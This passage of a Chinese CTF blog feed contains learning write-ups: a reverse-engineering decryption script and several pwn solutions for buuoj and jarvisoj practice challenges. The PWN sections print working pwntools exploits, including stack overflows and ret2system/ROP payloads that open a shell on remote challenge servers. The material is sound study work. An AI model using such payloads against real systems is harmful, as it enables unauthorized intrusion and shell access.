class="line">    v7 = fopen(<span class="string">&quot;rev_this&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !stream )</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No flag found, please make sure this is run on the server&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v7 )</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;please run this on the server&quot;</span>);</span><br><span class="line"></span><br><span class="line">    v6 = fread(ptr, <span class="number">0x18</span>uLL, <span class="number">1uLL</span>, stream); <span class="comment">//v6用于检查是否成功读取,flag长度为0x18==24</span></span><br><span class="line">                                            <span class="comment">//flag保存到ptr数组中</span></span><br><span class="line">                                            <span class="comment">//最后一位ptr[23]没有使用? &#x27;&#125;&#x27;?(一开始以为是&#x27;\0&#x27;)</span></span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt;= <span class="number">0</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i ) &#123;<span class="comment">//读取前8个</span></span><br><span class="line">        v11 = ptr[i];</span><br><span class="line">        fputc(v11, v7);<span class="comment">//向v7(即rev_this文件)原封不动的写入前8位flag字符</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">8</span>; j &lt;= <span class="number">22</span>; ++j ) &#123; <span class="comment">//读取第9-23个flag字符</span></span><br><span class="line">        v11 = ptr[j];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//转换算法</span></span><br><span class="line">        <span class="keyword">if</span> ( (j &amp; <span class="number">1</span>) != <span class="number">0</span> ) <span class="comment">//如果j为奇数---j==8时是偶数</span></span><br><span class="line">            v11 -= <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            v11 += <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">        fputc(v11, v7);<span class="comment">//处理后写入</span></span><br><span class="line">    &#125;</span><br><span class="line">    v11 = v5;<span class="comment">//这里IDA分析的有点问题,问题不大</span></span><br><span class="line">    fputc(v5, v7);</span><br><span class="line">    fclose(v7);</span><br><span class="line">    <span class="keyword">return</span> fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写解密脚本(c&#x2F;c++代码叫脚本?):</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line">    FILE* rev_this = <span class="built_in">fopen</span>(<span class="string">&quot;rev_this&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="built_in">fread</span>(str, <span class="number">0x18</span>uLL, <span class="number">1uLL</span>, rev_this);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(str[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">8</span>;i&lt;<span class="number">23</span>;++i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&amp;<span class="number">1</span>!=<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">putchar</span>(str[i]+<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">putchar</span>(str[i]<span class="number">-5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(str[<span class="number">23</span>]);<span class="comment">//单独处理一下那个v5(其实提交的时候加个&#125;就行,</span></span><br><span class="line">    <span class="comment">//但是这里因为不知道flag长啥样所以还是打印一下看看...万一是什么&#x27;\0&#x27;呢,doge)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801104929793.png" alt="image-20230801104929793"></p><p>结束…</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>先看看是啥文件—32位的,用IDA32打开</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802131013964.png" alt="image-20230802131013964" style="zoom:33%;" /><p>尝试IDA动态调试,莫名其妙不能动弹?难道是开了保护?(开保护是不能调试吗?)</p><p>额,nb…火力全开…</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802133400255.png" alt="image-20230802133400255" style="zoom:33%;" /><p>还是静态分析吧…</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802133651202.png" alt="image-20230802133651202" style="zoom: 50%;" /><p>这里其实最没弄明白的其实是那个LL,不确定val作为数组每个元素应该填充多长…但是这题是&lt;二进制&gt;赛项…</p><p>所以理论上这里应该是重点要关注的地方…</p><p>那么尽管IDA反编译出来的伪代码有点玄学…但是发现有一个重要的指针类型转换的步骤:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_QWORD *)&amp;var[<span class="number">13</span>] == <span class="number">17LL</span> )</span><br></pre></td></tr></table></figure><p><code>QWORD</code>这个东西是4字节…众所周知,一个字是2字节,那么QWORD是4个字,也就是8字节…对上了,就是LL(long long)</p><p>那么就往进塞数据呗(这里我仍然想吐槽python的类型转换)</p><p>用python写exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29245</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">13</span> * <span class="number">4</span> + p64(<span class="number">17</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果(第二次的截图,省略了ls了…doge)<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802140330345.png" alt="image-20230802140330345"></p><p>结束…</p><h2 id="mrctf2020-easyoverflow"><a href="#mrctf2020-easyoverflow" class="headerlink" title="mrctf2020_easyoverflow"></a>mrctf2020_easyoverflow</h2><p>这题就是个字符串溢出</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802154650856.png" alt="image-20230802154650856" style="zoom: 50%;" /><p>首先main中v5被赋值为一个字符串,我叫他fake_flag0,然后有一个对v4的gets()</p><p>再看下面判断调用了check,并传递了v5这个字符数组</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802154817689.png" alt="image-20230802154817689" style="zoom:50%;" /><p>参数和另一个字符串比较,去看看:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802154845478.png" alt="image-20230802154845478" style="zoom:50%;" /><p>把这个字符串复制出来,我叫他fake_flag1</p><p>然后发现 main中v4有0x30个字节(48个)—(-0x40)-(-0x70)&#x3D;&#x3D;0x30</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802155008720.png" alt="image-20230802155008720" style="zoom:50%;" /><p>所以把这段内存覆盖了就行,exp如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802155044396.png" alt="image-20230802155044396" style="zoom:50%;" /><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802155058403.png" alt="image-20230802155058403" style="zoom:50%;" /><p>结束…</p><h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><p>这道题最大的收获就是把x86的堆栈看了一遍,<del>还有脑内调试</del></p><p>有关X86 32位汇编利用堆栈传递函数参数的过程:</p><p>​<a href="https://blog.csdn.net/weixin_62320071/article/details/129475981">https://blog.csdn.net/weixin_62320071/article/details/129475981</a></p><p>​<a href="https://cloud.tencent.com/developer/article/2123636">https://cloud.tencent.com/developer/article/2123636</a></p><p>​<a href="https://zhuanlan.zhihu.com/p/290689333?ivk_sa=1024320u&utm_id=0">https://zhuanlan.zhihu.com/p/290689333?ivk_sa=1024320u&amp;utm_id=0</a></p><p>​<img src="https://pic2.zhimg.com/80/v2-53b1f83688ed5cc4bc7c5efa791a315d_1440w.webp" alt="img" style="zoom:65%;" /></p><p>题解:</p><p>这道题是典型的栈溢出,IDA反编译后的代码非常简单,有system函数的地址,而且我们可以通过字符串查找找到存在&#x2F;bin&#x2F;bash这个字符串(可获取地址)</p><p>那么我们就直接让vulnerable_function返回的时候跳转到system函数去getshell就可以</p><p>具体是由于read可输入的长度大于缓冲区的长度,所以存在溢出,那么只需要合理构造payload即可进行getshell</p><p>(但是我做这题很吃力,x86汇编属实不会,主要是对函数栈帧掌握不清楚)</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line">hacker = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">hacker = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25439</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x88</span></span><br><span class="line">system_func_addr = <span class="number">0x8048320</span></span><br><span class="line">bin_sh_str_addr = <span class="number">0x0804a024</span></span><br><span class="line"><span class="comment">#  首先先将该字符串数组填满，再输入一个地址，该地址将会作为新的栈底地址 ebp</span></span><br><span class="line"><span class="comment"># 再接着写入 函数调用返回的地址（即该值将来会pop 到 eip 中），即执行我们的system函数，为了把 字符串 /bin/sh 地址传入，我们还要往栈中随意插入一个将来的返回地址，再插入/bin/sh 地址</span></span><br><span class="line">payload = padding * <span class="string">b&#x27;a&#x27;</span> + p32(<span class="number">0xffffe000</span>) + p32(system_func_addr) + p32(<span class="number">0xffffe000</span>) + p32(bin_sh_str_addr)</span><br><span class="line"></span><br><span class="line">hacker.sendlineafter(<span class="string">b&#x27;Input:\n&#x27;</span>, payload)</span><br><span class="line">hacker.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802191847698.png" alt="image-20230802191847698"></p><p>勉强结束…</p><h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><h3 id="这道题学习到的知识点"><a href="#这道题学习到的知识点" class="headerlink" title="这道题学习到的知识点"></a>这道题学习到的知识点</h3><p>参阅:</p><p>​<a href="https://zhuanlan.zhihu.com/p/502718676">https://zhuanlan.zhihu.com/p/502718676</a></p><p>​<a href="https://stackoverflow.com/questions/23367624/intel-64-rsi-and-rdi-registers">https://stackoverflow.com/questions/23367624/intel-64-rsi-and-rdi-registers</a></p><p>​<a href="https://www.cnblogs.com/nemuzuki/p/17218722.html">https://www.cnblogs.com/nemuzuki/p/17218722.html</a></p><p>​</p><h4 id="x86-64函数传参使用到的寄存器"><a href="#x86-64函数传参使用到的寄存器" class="headerlink" title="x86_ 64函数传参使用到的寄存器"></a>x86_ 64函数传参使用到的寄存器</h4><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803114038935.png" alt="image-20230803114038935" style="zoom:50%;" /></p><p>​重点是rdi,rsi,rdx,rcx这几个</p><h3 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h3><h4 id="1-参数问题"><a href="#1-参数问题" class="headerlink" title="1.参数问题"></a>1.参数问题</h4><p>​这道题也是栈溢出,不过是x86_64的程序,所以我们重点注意的应该是去考虑x86_64和x86的堆栈(或者说函数调用时)有什么区别,而且重点要关注函数传参有什么不同</p><p>​经过学习,了解到在x86中,各个参数依次从右向左入栈(CDECL?),然后再压栈eip和ebp;</p><p>​而在x86_64中,如果子函数的参数数量&lt;&#x3D;6个,那么就会使用到6个特殊的寄存器,也就是上面的rdi，rsi，rdx，rcx，r8，r9这6个寄存器.然后如果还有参数,则像32位一样压栈.</p><p>​那么也就是说,64位程序调用函数时,<strong>会先把参数从寄存器中pop出来,也就是pop rdi; ret指令</strong></p><p>​对应到本题中调用system()函数只需要传递一个字符串,也就是system执行的命令,所以只需要多考虑一个rdi(第一个入参对应的寄存器)的问题</p><h4 id="2-题目分析"><a href="#2-题目分析" class="headerlink" title="2.题目分析"></a>2.题目分析</h4><p>​分析好关键后,接下来开始审题</p><p>​这次做题思路比较清晰,而且看了看雪上的某篇IDA使用教程,这回在IDAview视图中认真分析了一下汇编,后面记录一下(虽然和这道题的题解关系不大,但是有助于理解x86_64函数传参)</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803115419472.png" alt="image-20230803115419472" style="zoom:50%;" /></p><p>​题目和x86版本的基本一致,仍然是标准的栈溢出:buf数组长度为0x80,然而read()可以输入0x200,满足溢出</p><p>​同样,去找system()的地址和&#x2F;bin&#x2F;bash的地址</p><p>​shift+F12打开字符串,可以看到存在&#x2F;bin&#x2F;bash—0x600A90</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803115829908.png" alt="image-20230803115829908" style="zoom:50%;" /></p><p>​发现有_system函数(注意不是extern的那个system)—0x4004C0</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803115952419.png" alt="image-20230803115952419" style="zoom: 40%;" /></p><p>​接下来就是区别,需要找到pop rdi; ret指令的地址,以便调用</p><p>​这里需要使用到Linux下的ROPgadget工具查找(第一次用这个,看了一下使用方法)</p><p>​找到地址为0x4006b3<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803121412077.png" alt="image-20230803121412077"></p><h4 id="3-payload"><a href="#3-payload" class="headerlink" title="3.payload"></a>3.payload</h4><p>​覆盖模板: [函数局部变量(buf数组)]+[rbp]+[pop rdi; ret指令的地址]+[‘&#x2F;bin&#x2F;bash’的地址]+[system()函数的地址(实际上是那个_system())]</p><p>​python代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27828</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x4004C0</span></span><br><span class="line">bin_sh_addr = <span class="number">0x600A90</span></span><br><span class="line">pop_ret_addr = <span class="number">0x4006b3</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x80</span>) + <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x8</span>) + p64(pop_ret_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>​运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803122534132.png" alt="image-20230803122534132" style="zoom:45%;" /><p>​题解到此结束…</p><h3 id="题目IDAview分析记录"><a href="#题目IDAview分析记录" class="headerlink" title="题目IDAview分析记录"></a>题目IDAview分析记录</h3><h4 id="main-汇编分析"><a href="#main-汇编分析" class="headerlink" title="main()汇编分析"></a>main()汇编分析</h4><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803122808494.png" alt="image-20230803122808494"></p><p>main中有两个变量var_10和var_4</p><p>首先是调用main时,开头的push rbp;mov rbp,rsp指令创建函数栈帧,然后sub rsp,10h给局部变量(形参?)分配空间(10h应该是16字节给两个变量,一个int argc和一个char *argv[]的数组—数组形参实际上是一个指针,所以也是8字节)</p><p>然后接下来的两个mov就能看出来x86_64的传参了,第一个是edi,第二个是rsi,逐个从寄存器中复制到内存</p><p>然后eax置0</p><p>此时该调用函数了,因为vulnerable_function没有形参,所以没有对edi这些寄存器进行处理,直接调用</p><h4 id="vulnerable-function-汇编分析"><a href="#vulnerable-function-汇编分析" class="headerlink" title="vulnerable_function()汇编分析"></a>vulnerable_function()汇编分析</h4><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803123501210.png" alt="image-20230803123501210"></p><p>同样在开头push rbp;mov rbp,rsp创建函数栈帧</p><p>接下来是对rsp进行add,但是这里我不理解为什么是add而不是sub(),总之就是对buf数组进行处理分配</p><p>下一行就是为_system函数的调用做准备,处理实参:</p><p>​mov     edi, offset command ; “echo Input:”中,offset表示获取一个标号,command标号代表的内存中存有这个字符串,将其赋值给edi用于_system的第一个参数(只有这一个参数)</p><p>然后调用_system()</p><p>返回来后,继续为_read()的调用做准备:</p><p>​先放上来_read()的描述(注意参数的位置):</p><p>​<strong>其实这个函数就是unistd.h(UNIX std)中声明的read()函数,用于文件读写</strong></p><p>​第一个参数是文件描述符(0代表标准输入stdin,1代表标准输出stdout,2表示标准错误输出stderr)</p><p>​第二个参数是输入的目标缓冲区</p><p>​第三个参数是指定要读取的最大字节数</p><p>​<code>ssize_t read(int fd, void *buf, size_t nbytes)</code></p><p>​lea指令全称是 “Load Effective Address”，意为加载有效地址,就是将指定的内存地址计算出来并存放在目标寄存器中.这里这条指令将 <code>rbp+buf</code> 地址的计算结果保存在 <code>rax</code> 中,准备赋值给rsi</p><p>​将200h赋值给edx作为第3个参数(nbytes)</p><p>​将刚刚计算出来的eax赋值给rsi作为第二个参数(buf)</p><p>​将0h赋值给edi作为第一个参数(fd)</p><p>然后调用_read(),这道题的切入点就是这里</p><p>后面的部分没看…留作以后…</p><p>结束…</p><h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><p>这道题就是绕了一下,利用strcat()进行了栈溢出,同时不同的步骤需要从不同的函数进行处理利用,要进行顺序分析</p><p>分析如下:</p><p>代码首先需要输入正确的密码,然后下面是一个switch的循环(注意反编译显示循环使用一个跳转函数实现)</p><p>Addlog中允许输入0x80(128)长度的src</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230805200612721.png" alt="image-20230805200612721" style="zoom:50%;" /></p><p>print中有_system()函数可以利用</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230805200628207.png" alt="image-20230805200628207" style="zoom:45%;" /></p><p>getflag中有strcpy,同时局部变量(反编译问题)共有0x48,0x80&gt;0x48,满足溢出</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230805200700665.png" alt="image-20230805200700665" style="zoom:50%;" /></p><p>ROPgadget工具查找’sh’字符串的地址(此题没有&#x2F;bin&#x2F;sh)</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230805200722034.png" alt="image-20230805200722034" style="zoom: 40%;" /></p><p>先走1选项,输入足够长的字符串准备溢出,然后走4选项进行strcpy溢出,跳转至system()即可</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27895</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x080484D0</span></span><br><span class="line">sh_addr = <span class="number">0x080482ea</span></span><br><span class="line"><span class="comment"># pop_ret_addr = 0x4006b3 #64位用到</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x48</span> + <span class="number">4</span>) + p32(system_addr) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span> + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;administrator&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;info:&#x27;</span>, payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230805200041706.png" alt="image-20230805200041706" style="zoom:33%;" /><p>这题看了半天需要填充多少字节,唉,看错了</p><p>结束…</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> PWN </tag>
            
            <tag> x64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制作业第一周</title>
      <link href="/2023-07-27-a5c7985cb55b/"/>
      <url>/2023-07-27-a5c7985cb55b/</url>
      
        <content type="html"><![CDATA[<p>以前除了新生赛再没写过WP,还是多写这东西好(博客搭建还没搞好QWQ)</p><h1 id="RE"><a href="#RE" class="headerlink" title="RE:"></a>RE:</h1><p>所有题来自picoCTF2022,题目很简单,适用于萌新蒟蒻(比如我)入门快速适应re和pwn等题目的模式和解题一般顺序</p><h2 id="file-run1"><a href="#file-run1" class="headerlink" title="file-run1:"></a>file-run1:</h2><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420724-111.png" alt="img"></p><p>是的,我们需要一个命令行(显然可以知道是个bash…),丢进去跑就行了…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420724-112.png" alt="img"></p><p>菜鸟’s writeup结束…</p><p>或者有椰叶丢进IDA里瞧瞧…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420724-113.png" alt="img"></p><p>去找flag吧…(好像是ctrl+鼠标左键?…)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-114.png" alt="img"></p><p>结束了…</p><h2 id="file-run2"><a href="#file-run2" class="headerlink" title="file-run2:"></a>file-run2:</h2><p>丢个Hello!的参数跑就完事了(我太菜了)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-115.png" alt="img"></p><p>中间还打错个字母…</p><h2 id="GDB-Test-Drive"><a href="#GDB-Test-Drive" class="headerlink" title="GDB Test Drive:"></a>GDB Test Drive:</h2><p>emm…这玩意就是看看你gdb装没装…虽然但是,我还得学学gdb(毕竟CLion&#x2F;VS的可视化用惯了…)</p><p>(此处gdbme默认有x权限,所以没用chmod)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-116.png" alt="img"></p><p>一条一条运行调试的子命令就行(回头再学吧…gdb不是太会用)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-117.png" alt="img"></p><p>结束…</p><h2 id="patchme-py"><a href="#patchme-py" class="headerlink" title="patchme.py:"></a>patchme.py:</h2><p>咱就是问,还有什么比源码更香的东西吗?…直接分析源码…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-118.png" alt="img"></p><p>python这东西就在windows下跑吧,毕竟库都装在windows下(虽然不知道为啥控制台识别不到库…)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-119.png" alt="img"></p><p>直接看源码,发现就是个字符串比较(暂时不想管那个加密的事…)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-120.png" alt="img"></p><p>有一说一,我才懒得构造那个密码,我直接全删了:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-121.png" alt="img"></p><p>保存了再跑就完事了…(源码在手还怕啥)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-122.png" alt="img"></p><p>至于解密方法能看懂在干啥,但是密码基础一点没有,反正先能跑出来再说,坐等椰叶们讲解(doge)</p><h2 id="Safe-Opener"><a href="#Safe-Opener" class="headerlink" title="Safe Opener:"></a>Safe Opener:</h2><p>.java也是源码…</p><p>SublimeText4 yyds!!!我直接看源码(nnd我不会java怎么办…好在c++基础还可以…)</p><p>吐槽:java获取个输入这么费劲?还得手动创建输入流对象?</p><p>相信椰叶们都能看懂代码…密钥就是这一坨:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420725-123.png" alt="img"></p><p>而且一看就知道是base64</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-124.png" alt="img"></p><p>《最好用的Base64在线工具》…怕不是不知道CyberChef的大名…</p><p>结束…</p><h2 id="unpackme-py"><a href="#unpackme-py" class="headerlink" title="unpackme.py:"></a>unpackme.py:</h2><p>经典的加密解密库(但是我不会)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-125.png" alt="img"></p><p>第12行发现要对解码后的东西进行运行….所以知道加密的是一段代码,所以把exec换成print逝逝:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-126.png" alt="img"></p><p>这里有点奇葩,命令行找不到我的库…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-127.png" alt="img"></p><p>还是打开pycharm吧…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-128.png" alt="img"></p><p>好吧直接结束…</p><h2 id="bloat-py"><a href="#bloat-py" class="headerlink" title="bloat.py:"></a>bloat.py:</h2><p>这个程序的函数名和变量名一看就是故意的…加点注释一点点分析看看:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-129.png" alt="img"></p><p>可以看到函数arg133()中有一个比较,并且对比成功了会有一个输出,我们直接将那个字符串单独打印看看(先把其他代码注释掉):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-130.png" alt="img"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-131.png" alt="img"></p><p>也就是说我们输入的arg432变量的值就是这个,所以将代码恢复原样重新以这个输入值运行一遍:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-132.png" alt="img"></p><p>解密成功!</p><p>注: .enc文件为常见的加密后的文件格式,常常出现在勒索病毒运行后的结果,或对文件进行加密的情况,这里的代码即对其进行特定方式的解密</p><h2 id="Fresh-Java"><a href="#Fresh-Java" class="headerlink" title="Fresh Java:"></a>Fresh Java:</h2><p>这道题也不难,逆向一下class文件,然后写个解密脚本就行</p><h3 id="第一步-java逆向"><a href="#第一步-java逆向" class="headerlink" title="第一步-java逆向:"></a>第一步-java逆向:</h3><p>某椰叶提供的在线逆向网站:<a href="http://javare.cn(注意文本是白色的...我以为出问题了)/">http://javare.cn(注意文本是白色的...我以为出问题了)</a></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420726-133.png" alt="img"></p><p> 复制到一个java文件,观察发现(虽然我不会java,但是好在会其他语言…)对比的是一个字符串的每一个字符(ASCII码)</p><p>于是,我们可以使用正则表达式…把那一堆ASCII码提取出来(这里在sublimetext4里使用查找替换的正则模式):</p><h3 id="第二步-正则部分"><a href="#第二步-正则部分" class="headerlink" title="第二步-正则部分:"></a>第二步-正则部分:</h3><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步:"></a>第一步:</h4><p><img 